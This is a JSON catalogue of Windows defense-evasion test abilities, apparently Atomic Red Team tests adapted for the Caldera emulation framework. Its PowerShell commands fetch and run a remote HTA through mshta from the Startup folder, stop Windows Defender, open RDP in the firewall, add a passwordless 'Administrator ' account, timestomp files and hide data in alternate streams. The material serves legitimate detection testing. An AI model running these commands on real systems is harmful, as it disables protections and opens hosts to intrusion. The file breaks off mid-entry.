    "T1564__defense-evasion__Hide Artifacts__59638371d64a1fb450ee7f4d9c19b3d6": {
        "description": "NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account\nSee https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564",
            "name": "Hide Artifacts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "cmd /c \"#{nircmd_location}\"",
                    "command": "cmd /c \"#{nircmd_location}\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "59638371d64a1fb450ee7f4d9c19b3d6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "59638371d64a1fb450ee7f4d9c19b3d6"
    },
    "T1112__defense-evasion__Modify Registry__6722535bf5a14b87b5772b739f53321f": {
        "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1112",
            "name": "Modify Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6722535bf5a14b87b5772b739f53321f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6722535bf5a14b87b5772b739f53321f"
    },
    "T1070.006__defense-evasion__Indicator Removal on Host: Timestomp__1f2da2639fcd636ef1c7ead72de4469f": {
        "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.006",
            "name": "Indicator Removal on Host: Timestomp"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.CreationTime = \"01/01/1970 00:00:00\" }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1f2da2639fcd636ef1c7ead72de4469f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1f2da2639fcd636ef1c7ead72de4469f"
    },
    "T1218.005__defense-evasion__Signed Binary Proxy Execution: Mshta__337c07ce279b747827679ffb226e5d9c": {
        "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\" -ErrorAction Ignore",
                    "command": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\"; $var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; mshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; start-sleep -s 15; stop-process -name \"calculator\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "337c07ce279b747827679ffb226e5d9c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "337c07ce279b747827679ffb226e5d9c"
    },
    "T1218.001__defense-evasion__Signed Binary Proxy Execution: Compiled HTML File__0d2e984bedf73f5266e250d7ecd257cf": {
        "description": "Executes a CHM file with the default Shortcut Command method.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0d2e984bedf73f5266e250d7ecd257cf",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0d2e984bedf73f5266e250d7ecd257cf"
    },
    "T1218.007__defense-evasion__Signed Binary Proxy Execution: Msiexec__d3e69d970c19fb2a9a2ee8be47ea17ad": {
        "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d3e69d970c19fb2a9a2ee8be47ea17ad",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d3e69d970c19fb2a9a2ee8be47ea17ad"
    },
    "T1562.004__defense-evasion__Impair Defenses: Disable or Modify System Firewall__9378f5d52c7f94cd08f407f8c0a5fbd7": {
        "description": "This test will attempt to open a local port defined by input arguments to any profile",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.004",
            "name": "Impair Defenses: Disable or Modify System Firewall"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "netsh advfirewall firewall delete rule name=\"Open Port to Any\" | Out-Null",
                    "command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9378f5d52c7f94cd08f407f8c0a5fbd7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9378f5d52c7f94cd08f407f8c0a5fbd7"
    },
    "T1564.004__defense-evasion__Hide Artifacts: NTFS File Attributes__8da7c7a6e9a5b3bf95107b38230b09f6": {
        "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.004",
            "name": "Hide Artifacts: NTFS File Attributes"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini\" -Force -ErrorAction Ignore",
                    "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {;     New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki;     }; Start-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8da7c7a6e9a5b3bf95107b38230b09f6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8da7c7a6e9a5b3bf95107b38230b09f6"
    },
    "T1564.006__defense-evasion__Run Virtual Instance__5b0527d3382ac91860501cccc9595348": {
        "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.006",
            "name": "Run Virtual Instance"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-VM $VM -Force; Remove-VM $VM -Force",
                    "command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V) { ; } else {Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force};  ;  $VM = \"Atomic VM\"; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5b0527d3382ac91860501cccc9595348",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5b0527d3382ac91860501cccc9595348"
    },
    "T1218.005__defense-evasion__Signed Binary Proxy Execution: Mshta__c29f0da7c0bf612d30acb64e1d6e9368": {
        "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c29f0da7c0bf612d30acb64e1d6e9368",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c29f0da7c0bf612d30acb64e1d6e9368"
    },
    "T1036.003__defense-evasion__Masquerading: Rename System Utilities__d9c1b1283c1ad6fdda27be021c4737d3": {
        "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item ($env:TEMP + \"\\svchost.exe\") -Force -ErrorAction Ignore",
                    "command": "copy \"1db90b_T1036.003.exe\" ($env:TEMP + \"\\svchost.exe\"); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "1db90b_T1036.003.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "d9c1b1283c1ad6fdda27be021c4737d3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d9c1b1283c1ad6fdda27be021c4737d3"
    },
    "T1553.005__defense-evasion__Subvert Trust Controls: Mark-of-the-Web Bypass__7f0f5471543a6f188b0fbdc436c49fd9": {
        "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.005",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-Content -Path $env:tmp\\ReadMe.md -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'",
                    "command": "Unblock-File -Path $env:tmp\\ReadMe.md",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7f0f5471543a6f188b0fbdc436c49fd9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7f0f5471543a6f188b0fbdc436c49fd9"
    },
    "T1218.011__defense-evasion__Signed Binary Proxy Execution: Rundll32__16e96b0f0c0021663b2f5dfafabee6f0": {
        "description": "Rundll32.exe running non-dll \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "16e96b0f0c0021663b2f5dfafabee6f0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "16e96b0f0c0021663b2f5dfafabee6f0"
    },
    "T1564.004__defense-evasion__Hide Artifacts: NTFS File Attributes__1532b3faf25ad1e6f4fba4ada643b253": {
        "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.004",
            "name": "Hide Artifacts: NTFS File Attributes"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path $env:TEMP\\T1564.004_has_ads_powershell.txt -ErrorAction Ignore",
                    "command": "echo \"test\" > $env:TEMP\\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value \"test\"; set-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt -stream adstest.txt -value \"test2\"; set-content -path . -stream adstest.txt -value \"test3\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1532b3faf25ad1e6f4fba4ada643b253",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1532b3faf25ad1e6f4fba4ada643b253"
    },
    "T1027.004__defense-evasion__Obfuscated Files or Information: Compile After Delivery__55b2c04e70a5711957e264b04e645e91": {
        "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is contained in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027.004",
            "name": "Obfuscated Files or Information: Compile After Delivery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-Expression \"893687_T1027.004_DynamicCompile.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "893687_T1027.004_DynamicCompile.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "55b2c04e70a5711957e264b04e645e91",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "55b2c04e70a5711957e264b04e645e91"
    },
    "T1218__defense-evasion__Signed Binary Proxy Execution__51ef5578afcd873709d2c7672234e57b": {
        "description": "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path C:\\test -Recurse -Force",
                    "command": "if (-not (Test-Path C:\\test)) {; New-Item -Path C:\\test -ItemType Directory; } else {; Write-Host \"Directory C:\\test already exists.\" }; Copy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"C:\\test\\customshellhost.exe\" -Force; Copy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"C:\\test\\explorer.exe\" -Force; C:\\test\\customshellhost.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "51ef5578afcd873709d2c7672234e57b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "51ef5578afcd873709d2c7672234e57b"
    },
    "T1564__defense-evasion__Hide Artifacts__83a5ad479c9e313e60f34380e193102a": {
        "description": "Creating a user with a username containing with a space on the end",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564",
            "name": "Hide Artifacts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-LocalUser -Name \"Administrator \" 2>&1 | out-null",
                    "command": "New-LocalUser -Name \"Administrator \" -NoPassword",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "83a5ad479c9e313e60f34380e193102a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "83a5ad479c9e313e60f34380e193102a"
    },
    "T1218.004__defense-evasion__Signed Binary Proxy Execution: InstallUtil__3ed2af2ffd2e21a9b97fbfb732ef3971": {
        "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.txt\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallLog\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallState\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\notepad.exe\" -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"; $InstallerAssemblyFileName = 'readme.txt'; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"readme.txt\"; $ExpectedOutput = 'Constructor_'; Set-Location \"$Env:windir\\System32\\Tasks\"; Copy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine;     InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3ed2af2ffd2e21a9b97fbfb732ef3971",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3ed2af2ffd2e21a9b97fbfb732ef3971"
    },
    "T1218.007__defense-evasion__Signed Binary Proxy Execution: Msiexec__29d32b9096933705ce0fffc441283b20": {
        "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "29d32b9096933705ce0fffc441283b20",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "29d32b9096933705ce0fffc441283b20"
    },
    "T1112__defense-evasion__Modify Registry__7a6e495200cd37c66f02e7bc070b61a9": {
        "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1112",
            "name": "Modify Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"; Remove-item  $key -Recurse -ErrorAction Ignore",
                    "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"; $name =\"bad-subdomain\"; new-item $key -Name $name -Force; new-itemproperty $key$name -Name https -Value 2 -Type DWORD; new-itemproperty $key$name -Name http  -Value 2 -Type DWORD; new-itemproperty $key$name -Name *     -Value 2 -Type DWORD; ",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7a6e495200cd37c66f02e7bc070b61a9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7a6e495200cd37c66f02e7bc070b61a9"
    },
    "T1553.005__defense-evasion__Subvert Trust Controls: Mark-of-the-Web Bypass__d2e0c0165046372fcd5e2bf910eeb477": {
        "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.005",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Dismount-DiskImage -ImagePath \"053c10_AllTheThings.iso\" | Out-Null",
                    "command": "Mount-DiskImage -ImagePath \"053c10_AllTheThings.iso\" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel \"AllTheThings\"; $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\")); $instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "053c10_AllTheThings.iso",
                        "053c10_AllTheThings.iso"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "d2e0c0165046372fcd5e2bf910eeb477",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d2e0c0165046372fcd5e2bf910eeb477"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__0402c74f97e712d03605175c5ba9675b": {
        "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Try {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}",
                    "command": "Try {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}; if(0){;   $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse;   Try {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0402c74f97e712d03605175c5ba9675b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0402c74f97e712d03605175c5ba9675b"
    },
    "T1218.005__defense-evasion__Signed Binary Proxy Execution: Mshta__748882eaad1b31e8f90d9b31692200fe": {
        "description": "Executes an HTA Application by directly downloading from remote URI.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "748882eaad1b31e8f90d9b31692200fe",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "748882eaad1b31e8f90d9b31692200fe"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__afae914d4839d5194835d8475604e7b8": {
